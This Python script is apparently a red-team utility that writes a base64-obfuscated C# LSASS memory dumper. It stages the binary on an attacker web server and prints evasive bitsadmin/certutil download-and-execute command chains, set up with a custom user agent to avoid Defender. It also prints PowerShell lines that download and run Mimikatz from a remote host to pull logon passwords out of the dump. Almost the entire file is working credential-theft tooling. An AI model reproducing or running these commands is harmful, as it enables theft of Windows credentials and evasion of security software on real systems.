import os,sys
import base64
import argparse
from random import choice
from makehtml import copy
from makerunspace import certutil_b64encode

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell #bits proxy not tested to work :()

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

devhost = "192.168.135.7"

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writeminidump():
    upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLklPOwoKbmFtZXNwYWNlIE1pbmlEdW1wCnsKICAgIGNsYXNzIFByb2dyYW0KICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJEYmdoZWxwLmRsbCIpXQogICAgICAgIHN0YXRpYyBleHRlcm4gYm9vbCBNaW5pRHVtcFdyaXRlRHVtcChJbnRQdHIgaFByb2Nlc3MsIGludCBQcm9jZXNzSWQsIEludFB0ciBoRmlsZSwgaW50IER1bXBUeXBlLCBJbnRQdHIgRXhjZXB0aW9uUGFyYW0sIEludFB0ciBVc2VyU3RyZWFtUGFyYW0sIEludFB0ciBDYWxsYmFja1BhcmFtKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIE9wZW5Qcm9jZXNzKHVpbnQgcHJvY2Vzc0FjY2VzcywgYm9vbCBiSW5oZXJpdEhhbmRsZSwgaW50IHByb2Nlc3NJZCk7CgogICAgICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgICAgICB7"
    lower = "ICAgICAgICAgICAgUHJvY2Vzc1tdIGxzYXNzID0gUHJvY2Vzcy5HZXRQcm9jZXNzZXNCeU5hbWUoImxzYXNzIik7CiAgICAgICAgICAgIGludCBsc2Fzc19waWQgPSBsc2Fzc1swXS5JZDsKCiAgICAgICAgICAgIEludFB0ciBoUHJvY2VzcyA9IE9wZW5Qcm9jZXNzKDB4MDAxRjBGRkYsIGZhbHNlLCBsc2Fzc19waWQpOwogICAgICAgICAgICBib29sIGR1bXBlZCA9IE1pbmlEdW1wV3JpdGVEdW1wKGhQcm9jZXNzLCBsc2Fzc19waWQsIGR1bXBGaWxlLlNhZmVGaWxlSGFuZGxlLkRhbmdlcm91c0dldEhhbmRsZSgpLCAyLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIEludFB0ci5aZXJvKTsKICAgICAgICB9CiAgICB9Cn0="

    minidumpfilename = "MiniDump.cs"

    dumppath = "c:\\windows\\tasks\\"
    dumpfile = "lsass.dmp"
    dumpfilepath = dumppath + dumpfile
    dumpfilepath = dumpfilepath.replace('\\','\\\\') #prep for conversion to csharp

    data = "FileStream dumpFile = new FileStream(\"%s\", FileMode.Create);" % (dumpfilepath)

    with open(minidumpfilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("            " + data + "\n")
        f.write(lower)
    f.close()

    print('[+] minidump cs written: %s' % minidumpfilename)
    return minidumpfilename,dumpfilepath
    pass

def makecombo_minidump(lhost,exefilename):
    runfilename = exefilename
    bitsjobname = rand_word()
    randtxtname = "%s.txt" % rand_word()
    randexename = "%s.exe" % rand_word()
    runwebroot = "/var/www/html/"
    loadpath_met = "c:\\\\windows\\\\tasks\\\\%s"
    loadpath_cmd = loadpath_met.replace("\\\\","\\")
    utilpath = 'cmd /c %s'
    certutilcombo = "bitsadmin /Transfer myJob http://%s/%s %s && certutil -decode %s %s"
    if custom_agent == "0":
        certutilcombo_sub = "bitsadmin /Transfer %s http://%s/%s %s && del %s && certutil -decode %s %s"
    if custom_agent == "1":
        certutilcombo_sub = "bitsadmin /create /download %s && bitsadmin /setcustomheaders %s User-Agent:\"%s\" && bitsadmin /addFile %s http://%s/%s %s && bitsadmin /resume %s && ping 127.0.0.1 -n 10 > nul && bitsadmin /complete %s && del %s && certutil -decode %s %s"
    if proxy_steal == "1":
        certutilcombo_sub = "bitsadmin /util /setieproxy networkservice AUTODETECT && " + certutilcombo_sub

    certfilename = certutil_b64encode(runwebroot+exefilename)
    certfilepath_met = loadpath_met % randtxtname #certfilename
    certfilepath_cmd = loadpath_cmd % randtxtname #certfilename
    runfileroot = runwebroot + runfilename
    runfilepath_met = loadpath_met % randexename #runfilename
    runfilepath_cmd = loadpath_cmd % randexename #runfilename

    combo_one = certutilcombo % (lhost,certfilename,certfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "0":
        combo_one_sub = certutilcombo_sub % (bitsjobname,lhost,certfilename,certfilepath_cmd,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "1":
        combo_one_sub = certutilcombo_sub % (bitsjobname,bitsjobname,agent_string,bitsjobname,lhost,certfilename,certfilepath_cmd,bitsjobname,bitsjobname,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    combo_two = utilpath % (runfilepath_cmd) # no need to pass args
    combo_break = combo_one + " && " + combo_two
    combo_break_sub = combo_one_sub + " && " + combo_two

    copy(certfilename,runwebroot,certfilename)
    print('[*] upload:\nupload %s %s' % (runfileroot,runfilepath_met)) 
    print(combo_one)
    print(combo_one_sub)
    print('[*] check:\ndir %s' % (runfilepath_cmd))
    print('[*] use (only with admin privileges!):\n%s ' % (combo_two))
    print('[!] c-c-c-combo breaker (cmd only!) (only with admin privileges!) (sub):\n%s' % combo_break_sub)
    
    return combo_break,combo_break_sub
    pass

def makeminidump(bitness,lhost):
    print('[!] warning! run only with admin priv!')
    minidumpfilename,dumpfilepath = writeminidump()
    dumpfilepath = dumpfilepath.replace('\\\\','\\')
    csfilepath = "/home/kali/data/MiniDump/MiniDump/"
    csfilename = "Program.cs"
    exewebroot = "/var/www/html/"
    exefilename = "MiniDump.exe"

    copy(minidumpfilename,csfilepath,csfilename)
    input("[!] build %s%s with bitness %s .. press enter to continue\n" % (csfilepath,csfilename,bitness))
    if bitness == "64":
        copy("%sbin/x64/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)
    if bitness == "32":
        copy("%sbin/x86/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)

    makecombo_minidump(lhost,exefilename)
    #print('[*] usage:\n.\\MiniDump.exe')
    print('[!] check dump:\ndir %s' % dumpfilepath)
    print('[!] dump lsass (on windows!):\ndownload %s\ncp lsass.dmp /var/www/html/\nwget -uri http://%s/lsass.dmp -OutFile C:\\tools\\lsass.dmp\niex(new-object net.webclient).downloadstring(\'http://%s/kiwi.txt\')\nInvoke-Mimikatz -Command "`"sekurlsa::minidump c:\\tools\\lsass.dmp`" sekurlsa::logonpasswords" > c:\\tools\\dump.txt\ntype c:\\tools\\dump.txt' % (dumpfilepath,devhost,devhost))

    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host

    makeminidump(bitness,lhost)